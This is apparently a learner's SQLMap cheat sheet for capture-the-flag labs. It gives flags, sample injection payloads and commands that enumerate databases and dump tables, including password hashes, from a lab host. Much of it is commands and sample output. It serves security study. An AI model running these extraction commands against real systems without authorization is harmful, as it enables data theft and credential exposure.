
## 📌 SQLMap Cheat sheet

**SQLMap** is an automated tool for detecting and exploiting **SQL injection** vulnerabilities in web applications.  
It simplifies the process of identifying these vulnerabilities and extracting data from databases.

---

### ⚙️ Common Flags

|Flag|Description|
|---|---|
|`-u URL`|Target URL (GET parameters)|
|`-r file.txt`|HTTP request file (for POST, cookies etc)|
|`--cookie`|Use specific cookies|
|`--data`|Data for POST requests|
|`--method`|Force HTTP method|
|`--level`|Increase tests depth (default: 1)|
|`--risk`|Risk of tests (default: 1)|

#### Database Extraction

|Flag|Description|
|---|---|
|`--dbs`|List all DBMS databases|
|`-D <db>`|Specify database|
|`--tables`|List tables in specified database|
|`-T <table>`|Specify table|
|`--columns`|List columns in specified table|
|`-C <col>`|Specify columns|
|`--dump`|Dump table entries|
|`--dump-all`|Dump everything|

#### Other Info

|Flag|Description|
|---|---|
|`-b, --banner`|Retrieve DBMS banner/version|
|`--current-user`|Get DBMS user|
|`--current-db`|Get current DB|
|`--passwords`|Enumerate DBMS users/passwords|
|`--schema`|Get full schema|
|`-a, --all`|Retrieve everything|

#### Help / Ease of use

|Flag|Description|
|---|---|
|`--help`|List all options|
|`--wizard`|Interactive wizard mode|

---

## 🚀 Usage Examples

### 🧭 Interactive Wizard

sqlmap --wizard

```
sqlmap --wizard
```

Walks you through an interactive series of prompts.

---

### 🔍 Testing for SQL Injection

#### HTTP GET Example

sqlmap -u "http://target.thm/search?cat=1"

```
sqlmap -u "http://target.thm/search?cat=1"
```

- SQLMap tests common injection techniques:
    
    - boolean-based blind
        
    - error-based
        
    - time-based blind
        
    - UNION query
        

Sample output might include:

Parameter: cat (GET)
    Type: boolean-based blind
    Payload: cat=1 AND 2175=2175
    Type: error-based
    Payload: cat=1 AND EXTRACTVALUE(...)
    Type: time-based
    Payload: cat=1 AND SLEEP(5)
    Type: UNION
    Payload: cat=1 UNION SELECT ...

```
Parameter: cat (GET)
    Type: boolean-based blind
    Payload: cat=1 AND 2175=2175
    Type: error-based
    Payload: cat=1 AND EXTRACTVALUE(...)
    Type: time-based
    Payload: cat=1 AND SLEEP(5)
    Type: UNION
    Payload: cat=1 UNION SELECT ...
```

---

### 🏗️ Extracting Databases

sqlmap -u "http://target.thm/search?cat=1" --dbs

```
sqlmap -u "http://target.thm/search?cat=1" --dbs
```

Output:

available databases [2]:
[*] users
[*] members

```
available databases [2]:
[*] users
[*] members
```

---

### 📚 Extracting Tables from a DB

sqlmap -u "http://target.thm/search?cat=1" -D users --tables

```
sqlmap -u "http://target.thm/search?cat=1" -D users --tables
```

Output:

Database: users
+-----------+
| johnath   |
| alexas    |
| thomas    |
+-----------+

```
Database: users
+-----------+
| johnath   |
| alexas    |
| thomas    |
+-----------+
```

---

### 🗄️ Dumping Table Data

sqlmap -u "http://target.thm/search?cat=1" -D users -T thomas --dump

```
sqlmap -u "http://target.thm/search?cat=1" -D users -T thomas --dump
```

Output:

Database: users
Table: thomas
+--------+----------+-------------+
| id     | name     | passhash    |
+--------+----------+-------------+
| 1      | alice    | $2y$...     |
+--------+----------+-------------+

```
Database: users
Table: thomas
+--------+----------+-------------+
| id     | name     | passhash    |
+--------+----------+-------------+
| 1      | alice    | $2y$...     |
+--------+----------+-------------+
```

- It may offer to **store hashes** or try to **crack them**.

---

## 📝 Notes on Exploitation Types

- **Boolean-based blind**: relies on true/false conditions (e.g. `1=1`).
    
- **Error-based**: forces the database to throw errors that leak data.
    
- **Time-based blind**: uses `SLEEP()` to see if page delay indicates true/false.
    
- **UNION query**: combines results from injected SELECT.
    

---

## 🔥 Quick Cheat Sheet

# Test and find injection
sqlmap -u "http://target.thm/?id=1"

# List databases
sqlmap -u "http://target.thm/?id=1" --dbs

# List tables in a DB
sqlmap -u "http://target.thm/?id=1" -D mydb --tables

# List columns in a table
sqlmap -u "http://target.thm/?id=1" -D mydb -T users --columns

# Dump data from a table
sqlmap -u "http://target.thm/?id=1" -D mydb -T users --dump

```
# Test and find injection
sqlmap -u "http://target.thm/?id=1"

# List databases
sqlmap -u "http://target.thm/?id=1" --dbs

# List tables in a DB
sqlmap -u "http://target.thm/?id=1" -D mydb --tables

# List columns in a table
sqlmap -u "http://target.thm/?id=1" -D mydb -T users --columns

# Dump data from a table
sqlmap -u "http://target.thm/?id=1" -D mydb -T users --dump
```

---

✅ **Tip:** Always run with `--batch` on CTFs or automation to skip questions.

sqlmap -u "http://target.thm/?id=1" --dbs --batch

```
sqlmap -u "http://target.thm/?id=1" --dbs --batch
```

---